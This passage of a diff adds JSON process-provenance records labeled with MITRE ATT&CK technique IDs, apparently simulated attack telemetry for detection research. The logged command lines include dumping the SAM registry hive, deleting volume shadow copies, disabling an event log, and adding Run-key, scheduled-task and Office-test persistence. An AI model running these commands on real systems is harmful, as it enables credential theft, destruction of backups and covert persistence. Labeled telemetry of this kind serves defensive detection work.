+        "Pid": 10752
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235089,
+    "label": "T1562.004_41627f71f968225b9f162cb76d16bd9d"
+}
+{
+    "srcNode": {
+        "UUID": "560e5f72-d85e-5ec1-9292-4a43141c3374",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 12661,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "d92d2432-6c5d-54d8-87dc-cd243d64e7e9",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv C:\\Users\\user\\AppData\\Local\\Temp\\TT_2015.log\"",
+        "Type": "Process",
+        "Pid": 3352
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235089,
+    "label": "T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2"
+}
+{
+    "srcNode": {
+        "UUID": "d92d2432-6c5d-54d8-87dc-cd243d64e7e9",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv C:\\Users\\user\\AppData\\Local\\Temp\\TT_2015.log\"",
+        "Type": "Process",
+        "Pid": 3352
+    },
+    "dstNode": {
+        "UUID": "35209bad-7bf3-517d-9a9b-c7667baab1e8",
+        "Name": "C:\\Users\\user\\AppData\\Local\\Temp\\TT_2015.log",
+        "Type": "File"
+    },
+    "relation": "QueryBasicInformationFile",
+    "timestamp": 1655235090,
+    "label": "T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2"
+}
+{
+    "srcNode": {
+        "UUID": "d92d2432-6c5d-54d8-87dc-cd243d64e7e9",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -c \"Get-WmiObject -class win32_operatingsystem | select -property * | export-csv C:\\Users\\user\\AppData\\Local\\Temp\\TT_2015.log\"",
+        "Type": "Process",
+        "Pid": 3352
+    },
+    "dstNode": {
+        "UUID": "35209bad-7bf3-517d-9a9b-c7667baab1e8",
+        "Name": "C:\\Users\\user\\AppData\\Local\\Temp\\TT_2015.log",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655235090,
+    "label": "T1059.001_702bfdd2-9947-4eda-b551-c3a1ea9a59a2"
+}
+{
+    "srcNode": {
+        "UUID": "560e5f72-d85e-5ec1-9292-4a43141c3374",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 12661,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "1846811d-24a4-5c7f-bf0e-8ea5376ce22a",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  save HKLM\\sam C:\\Users\\ezk\\AppData\\Local\\Temp\\sam ",
+        "Type": "Process",
+        "Pid": 9544
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235091,
+    "label": "T1003.002_7fa4ea18694f2552547b65e23952cabb"
+}
+{
+    "srcNode": {
+        "UUID": "1846811d-24a4-5c7f-bf0e-8ea5376ce22a",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  save HKLM\\sam C:\\Users\\ezk\\AppData\\Local\\Temp\\sam ",
+        "Type": "Process",
+        "Pid": 9544
+    },
+    "dstNode": {
+        "UUID": "634c08ca-fcb6-56cd-8501-95f5fd46d40d",
+        "Name": "C:\\Users\\ezk\\AppData\\Local\\Temp\\sam",
+        "Type": "File"
+    },
+    "relation": "QueryBasicInformationFile",
+    "timestamp": 1655235093,
+    "label": "T1003.002_7fa4ea18694f2552547b65e23952cabb"
+}
+{
+    "srcNode": {
+        "UUID": "1846811d-24a4-5c7f-bf0e-8ea5376ce22a",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  save HKLM\\sam C:\\Users\\ezk\\AppData\\Local\\Temp\\sam ",
+        "Type": "Process",
+        "Pid": 9544
+    },
+    "dstNode": {
+        "UUID": "634c08ca-fcb6-56cd-8501-95f5fd46d40d",
+        "Name": "C:\\Users\\ezk\\AppData\\Local\\Temp\\sam",
+        "Type": "File"
+    },
+    "relation": "CloseFile",
+    "timestamp": 1655235093,
+    "label": "T1003.002_7fa4ea18694f2552547b65e23952cabb"
+}
+{
+    "srcNode": {
+        "UUID": "560e5f72-d85e-5ec1-9292-4a43141c3374",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 12661,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "2cd372fc-7d3e-54ea-a933-e57edcec3dd0",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();}",
+        "Type": "Process",
+        "Pid": 204
+    },
+    "relation": "Process Create",
+    "timestamp": 1655235094,
+    "label": "T1490_e90756bb6dcd21462dc4cc452661df91"
+}
+{
+    "srcNode": {
+        "UUID": "eb454544-f3a9-5c36-bb55-e20bd748db37",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 54157,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "0b6a6eb6-6e2a-5946-9e09-1fe5682804a4",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"$RunKey = \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"; Set-ItemProperty -Path $RunKey -Name \\\"DisableScanOnRealtimeEnable\\\" -Value \\\"537ae7b28196cba2527a3da539b5594777dfac97620a30085b271130a71c4973.bak\\\"\"",
+        "Type": "Process",
+        "Pid": 5536
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174697,
+    "label": "T1547.001_777043894e42d2aae3881e63f6c76d33"
+}
+{
+    "srcNode": {
+        "UUID": "0b6a6eb6-6e2a-5946-9e09-1fe5682804a4",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"$RunKey = \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"; Set-ItemProperty -Path $RunKey -Name \\\"DisableScanOnRealtimeEnable\\\" -Value \\\"537ae7b28196cba2527a3da539b5594777dfac97620a30085b271130a71c4973.bak\\\"\"",
+        "Type": "Process",
+        "Pid": 5536
+    },
+    "dstNode": {
+        "UUID": "e24506e4-ff14-5b90-8697-1c5028aafdf1",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\DisableScanOnRealtimeEnable",
+        "Type": "Registry",
+        "Value": "537ae7b28196cba2527a3da539b5594777dfac97620a30085b271130a71c4973.bak"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655174699,
+    "label": "T1547.001_777043894e42d2aae3881e63f6c76d33"
+}
+{
+    "srcNode": {
+        "UUID": "0b6a6eb6-6e2a-5946-9e09-1fe5682804a4",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"$RunKey = \\\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\\"; Set-ItemProperty -Path $RunKey -Name \\\"DisableScanOnRealtimeEnable\\\" -Value \\\"537ae7b28196cba2527a3da539b5594777dfac97620a30085b271130a71c4973.bak\\\"\"",
+        "Type": "Process",
+        "Pid": 5536
+    },
+    "dstNode": {
+        "UUID": "e24506e4-ff14-5b90-8697-1c5028aafdf1",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\DisableScanOnRealtimeEnable",
+        "Type": "Registry",
+        "Value": "537ae7b28196cba2527a3da539b5594777dfac97620a30085b271130a71c4973.bak"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655174699,
+    "label": "T1547.001_777043894e42d2aae3881e63f6c76d33"
+}
+{
+    "srcNode": {
+        "UUID": "eb454544-f3a9-5c36-bb55-e20bd748db37",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 54157,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "ae5df2b5-36e9-5c79-a700-4f5139b4eb3d",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "wmic  /node:\"localhost\" shadowcopy call create Volume=C:\\",
+        "Type": "Process",
+        "Pid": 7152
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174700,
+    "label": "T1003.003_f049b89533298c2d6cd37a940248b219"
+}
+{
+    "srcNode": {
+        "UUID": "1b653d2a-793a-5923-b096-de3a24b3ec33",
+        "Name": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32",
+        "Image": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe",
+        "Cmdline": "C:\\Program Files (x86)\\Adobe\\Acrobat Reader DC\\Reader\\AcroRd32.exe /N /T /O /H /P",
+        "Pid": 72317,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "4b26209b-2e47-58e0-86ca-cbefe4a85191",
+        "Name": "schtasks.exe",
+        "Image": "C:\\Windows\\system32\\schtasks.exe",
+        "Cmdline": "schtasks /create /ru system /sc daily /tr \"Assistance and Recovery(china).bin\" /tn win32times /f",
+        "Type": "Process",
+        "Pid": 2620
+    },
+    "relation": "Process Create",
+    "timestamp": 1655177619,
+    "label": "T1036.004_7de3d7b4922a7b996d8df36fb22bb118"
+}
+{
+    "srcNode": {
+        "UUID": "1d25d86a-b6b5-5eef-b6d1-33df5ddf8d63",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 33150,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "cf79ab6c-ebff-5f6b-8f3f-fc646bce1102",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /node:127.0.0.1 process call create KOR0B5AA.exe",
+        "Type": "Process",
+        "Pid": 6996
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245516,
+    "label": "T1047_f4b0b4129560ea66f9751275e82f6bab"
+}
+{
+    "srcNode": {
+        "UUID": "cf79ab6c-ebff-5f6b-8f3f-fc646bce1102",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "\"C:\\Windows\\System32\\Wbem\\WMIC.exe\" /node:127.0.0.1 process call create KOR0B5AA.exe",
+        "Type": "Process",
+        "Pid": 6996
+    },
+    "dstNode": {
+        "UUID": "099ac3ab-9d10-5c4e-8ed3-39dd653408df",
+        "Name": "KOR0B5AA",
+        "Image": "KOR0B5AA.exe",
+        "Cmdline": "KOR0B5AA.exe",
+        "Pid": 63148,
+        "Type": "Process"
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245517,
+    "label": "T1047_f4b0b4129560ea66f9751275e82f6bab"
+}
+{
+    "srcNode": {
+        "UUID": "099ac3ab-9d10-5c4e-8ed3-39dd653408df",
+        "Name": "KOR0B5AA",
+        "Image": "KOR0B5AA.exe",
+        "Cmdline": "KOR0B5AA.exe",
+        "Pid": 63148,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "2abfa81e-061e-5cd0-8f4d-a6b073b6d76b",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C wevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:false",
+        "Type": "Process",
+        "Pid": 6480
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245539,
+    "label": "T1562.002_94f51bf01a7036fe02d07b4c18967669"
+}
+{
+    "srcNode": {
+        "UUID": "2abfa81e-061e-5cd0-8f4d-a6b073b6d76b",
+        "Name": "cmd.exe",
+        "Image": "C:\\Windows\\system32\\cmd.exe",
+        "Cmdline": "cmd.exe /C wevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:false",
+        "Type": "Process",
+        "Pid": 6480
+    },
+    "dstNode": {
+        "UUID": "ae1373f6-1955-5011-95e3-0722d3f209ef",
+        "Name": "wevtutil.exe",
+        "Image": "C:\\Windows\\system32\\wevtutil.exe",
+        "Cmdline": "wevtutil  sl \"Microsoft-Windows-IKE/Operational\" /e:false",
+        "Type": "Process",
+        "Pid": 9732
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245541,
+    "label": "T1562.002_94f51bf01a7036fe02d07b4c18967669"
+}
+{
+    "srcNode": {
+        "UUID": "099ac3ab-9d10-5c4e-8ed3-39dd653408df",
+        "Name": "KOR0B5AA",
+        "Image": "KOR0B5AA.exe",
+        "Cmdline": "KOR0B5AA.exe",
+        "Pid": 63148,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "f458ef91-e93b-530f-960f-e75d96133991",
+        "Name": "net.exe",
+        "Image": "C:\\Windows\\system32\\net.exe",
+        "Cmdline": "net  accounts /domain",
+        "Type": "Process",
+        "Pid": 2172
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245543,
+    "label": "T1201_38f6f0e50a6b196140ec40d3dc9cc9e6"
+}
+{
+    "srcNode": {
+        "UUID": "099ac3ab-9d10-5c4e-8ed3-39dd653408df",
+        "Name": "KOR0B5AA",
+        "Image": "KOR0B5AA.exe",
+        "Cmdline": "KOR0B5AA.exe",
+        "Pid": 63148,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "c75bd525-60ff-5ff7-9286-903157d5a5f5",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"C:\\Path\\AtomicRedTeam.dll\"",
+        "Type": "Process",
+        "Pid": 10632
+    },
+    "relation": "Process Create",
+    "timestamp": 1655245547,
+    "label": "T1137.002_e2af3c3ab1b0f659c874b8af58c49759"
+}
+{
+    "srcNode": {
+        "UUID": "c75bd525-60ff-5ff7-9286-903157d5a5f5",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"KOR0B5AA.exe\"",
+        "Type": "Process",
+        "Pid": 10632
+    },
+    "dstNode": {
+        "UUID": "60b06957-3c94-5cd2-b96d-d5143979e86d",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Office test\\Special\\Perf\\(Default)",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655245548,
+    "label": "T1137.002_e2af3c3ab1b0f659c874b8af58c49759"
+}
+{
+    "srcNode": {
+        "UUID": "c75bd525-60ff-5ff7-9286-903157d5a5f5",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Office test\\Special\\Perf\" /t REG_SZ /d \"KOR0B5AA.exe\"",
+        "Type": "Process",
+        "Pid": 10632
+    },
+    "dstNode": {
+        "UUID": "16dde88f-1a0e-5a2c-b5f2-94436b6b163f",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Office test\\Special\\Perf",
+        "Type": "Registry"
+    },
+    "relation": "RegCloseKey",
+    "timestamp": 1655245548,
+    "label": "T1137.002_e2af3c3ab1b0f659c874b8af58c49759"
+}
+{
+    "srcNode": {
+        "UUID": "85dc796f-b75c-551d-94b2-658f919ec542",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 27856,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "49a6f47c-30ab-5579-83f5-6240b8bca756",
+        "Name": "powershell.exe",
+        "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "Cmdline": "powershell.exe -ExecutionPolicy Bypass -C \"Copy-Item C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\Temp\\debug.exe;C:\\Windows\\Temp\\debug.exe get-process >> C:\\Windows\\temp\\debug.log;C:\\Windows\\Temp\\debug.exe get-localgroup >> C:\\Windows\\temp\\debug.log;C:\\Windows\\Temp\\debug.exe get-localuser >> C:\\Windows\\temp\\debug.log;C:\\Windows\\Temp\\debug.exe Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion >> C:\\Windows\\temp\\debug.log;\"",
+        "Type": "Process",
+        "Pid": 5156
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174129,
+    "label": "T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d"
+}
+{
+    "srcNode": {
+        "UUID": "2f0f5f9d-4155-5251-b00a-2cd68189ad53",
+        "Name": "debug.exe",
+        "Image": "C:\\Windows\\Temp\\debug.exe",
+        "Cmdline": "\"C:\\Windows\\Temp\\debug.exe\" get-process",
+        "Type": "Process",
+        "Pid": 10884
+    },
+    "dstNode": {
+        "UUID": "d42297b6-5e68-51e9-bc44-ce9157ded586",
+        "Name": "C:\\Users\\montgomerychristine\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\debug.exe.log",
+        "Type": "File"
+    },
+    "relation": "QueryBasicInformationFile",
+    "timestamp": 1655174131,
+    "label": "T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d"
+}
+{
+    "srcNode": {
+        "UUID": "07d33672-3225-5dd3-968a-087f0a291d80",
+        "Name": "debug.exe",
+        "Image": "C:\\Windows\\Temp\\debug.exe",
+        "Cmdline": "\"C:\\Windows\\Temp\\debug.exe\" Get-ItemProperty Registry::HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion",
+        "Type": "Process",
+        "Pid": 2592
+    },
+    "dstNode": {
+        "UUID": "21222cb0-a2ea-5064-b6a5-c741c4158a65",
+        "Key": "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\S-1-5-21-4065680934-2604657585-3199708412-1106\\\\Device\\HarddiskVolume3\\Windows\\Temp\\debug.exe",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655174135,
+    "label": "T1059.001_e5f9de8f-3df1-4e78-ad92-a784e3f6770d"
+}
+{
+    "srcNode": {
+        "UUID": "85dc796f-b75c-551d-94b2-658f919ec542",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 27856,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "199af48e-9ef0-5688-a457-ee50de76f5a7",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "wmic  shadowcopy call create Volume=C:\\",
+        "Type": "Process",
+        "Pid": 7820
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174137,
+    "label": "T1003.003_9f73269695e54311dd61dc68940fb3e1"
+}
+{
+    "srcNode": {
+        "UUID": "85dc796f-b75c-551d-94b2-658f919ec542",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 27856,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "f6f82610-053a-5145-be24-21995403bb77",
+        "Name": "WMIC.exe",
+        "Image": "C:\\Windows\\System32\\Wbem\\WMIC.exe",
+        "Cmdline": "wmic /node:\"127.0.0.1\" service where (caption like MMCSS)",
+        "Type": "Process",
+        "Pid": 660
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174139,
+    "label": "T1047_6935e41353aa781bb723462d26114c44"
+}
+{
+    "srcNode": {
+        "UUID": "b57ac9ba-5631-5dfb-9c14-8e90aeb050d2",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 23170,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "301b7ebb-2256-5ea6-affb-8c0803367871",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion",
+        "Type": "Process",
+        "Pid": 6844
+    },
+    "relation": "Process Create",
+    "timestamp": 1655177493,
+    "label": "T1518_8ddfaf982ab359cda13626b870ccb339"
+}
+{
+    "srcNode": {
+        "UUID": "301b7ebb-2256-5ea6-affb-8c0803367871",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion",
+        "Type": "Process",
+        "Pid": 6844
+    },
+    "dstNode": {
+        "UUID": "2077d0a0-9846-5ac4-bc4c-5c8d9fe8b3e8",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\svcVersion",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655177494,
+    "label": "T1518_8ddfaf982ab359cda13626b870ccb339"
+}
+{
+    "srcNode": {
+        "UUID": "301b7ebb-2256-5ea6-affb-8c0803367871",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion",
+        "Type": "Process",
+        "Pid": 6844
+    },
+    "dstNode": {
+        "UUID": "2077d0a0-9846-5ac4-bc4c-5c8d9fe8b3e8",
+        "Key": "HKLM\\SOFTWARE\\Microsoft\\Internet Explorer\\svcVersion",
+        "Type": "Registry",
+        "Value": "11.789.19041.0"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655177494,
+    "label": "T1518_8ddfaf982ab359cda13626b870ccb339"
+}
+{
+    "srcNode": {
+        "UUID": "b57ac9ba-5631-5dfb-9c14-8e90aeb050d2",
+        "Name": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD",
+        "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+        "Cmdline": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE /n /dde",
+        "Pid": 23170,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "0520df4a-00da-5c3c-8b70-7842d3abc7e2",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 7696
+    },
+    "relation": "Process Create",
+    "timestamp": 1655177502,
+    "label": "T1112_ba6f6214dbd17c54001e0a163b60f151"
+}
+{
+    "srcNode": {
+        "UUID": "0520df4a-00da-5c3c-8b70-7842d3abc7e2",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 7696
+    },
+    "dstNode": {
+        "UUID": "e4434d76-fadf-5e65-9f7b-e913cd8d4460",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSetTaskbar",
+        "Type": "Registry"
+    },
+    "relation": "RegQueryValue",
+    "timestamp": 1655177504,
+    "label": "T1112_ba6f6214dbd17c54001e0a163b60f151"
+}
+{
+    "srcNode": {
+        "UUID": "0520df4a-00da-5c3c-8b70-7842d3abc7e2",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 7696
+    },
+    "dstNode": {
+        "UUID": "e4434d76-fadf-5e65-9f7b-e913cd8d4460",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoSetTaskbar",
+        "Type": "Registry",
+        "Value": "1"
+    },
+    "relation": "RegSetValue",
+    "timestamp": 1655177504,
+    "label": "T1112_ba6f6214dbd17c54001e0a163b60f151"
+}
+{
+    "srcNode": {
+        "UUID": "d90fdca0-0fca-53a0-8bfd-cd928d0cb069",
+        "Name": "yLwPbSxHhKuGzBkGoAoO",
+        "Image": "yLwPbSxHhKuGzBkGoAoO",
+        "Cmdline": "yLwPbSxHhKuGzBkGoAoO",
+        "Pid": 88914,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "185ac8ef-136e-563f-9d7e-074b2ba5b681",
+        "Name": "netsh.exe",
+        "Image": "C:\\Windows\\system32\\netsh.exe",
+        "Cmdline": "\"C:\\Windows\\system32\\netsh.exe\" wlan show profiles",
+        "Type": "Process",
+        "Pid": 2308
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174357,
+    "label": "T1016_a0676fe1-cd52-482e-8dde-349b73f9aa69"
+}
+{
+    "srcNode": {
+        "UUID": "d90fdca0-0fca-53a0-8bfd-cd928d0cb069",
+        "Name": "yLwPbSxHhKuGzBkGoAoO",
+        "Image": "yLwPbSxHhKuGzBkGoAoO",
+        "Cmdline": "yLwPbSxHhKuGzBkGoAoO",
+        "Pid": 88914,
+        "Type": "Process"
+    },
+    "dstNode": {
+        "UUID": "f6fd21b9-d583-5edd-8707-f42fd7c7b4fc",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 3476
+    },
+    "relation": "Process Create",
+    "timestamp": 1655174406,
+    "label": "T1112_257313a3c93e3bb7dfb60d6753b09e34"
+}
+{
+    "srcNode": {
+        "UUID": "f6fd21b9-d583-5edd-8707-f42fd7c7b4fc",
+        "Name": "reg.exe",
+        "Image": "C:\\Windows\\system32\\reg.exe",
+        "Cmdline": "reg  add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f",
+        "Type": "Process",
+        "Pid": 3476
+    },
+    "dstNode": {
+        "UUID": "2ae8cfba-e069-5692-82bd-53a06c368c41",
+        "Key": "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\NoFileMenu",
